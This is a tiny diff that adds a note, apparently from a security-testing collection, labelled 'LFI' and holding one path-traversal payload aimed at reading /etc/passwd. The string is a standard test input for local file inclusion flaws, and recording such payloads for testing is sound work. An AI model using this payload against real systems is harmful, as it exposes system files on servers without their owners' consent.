@@ -1,0 +1,2 @@
+# LFI
+Payload: ../../../../etc/passwd
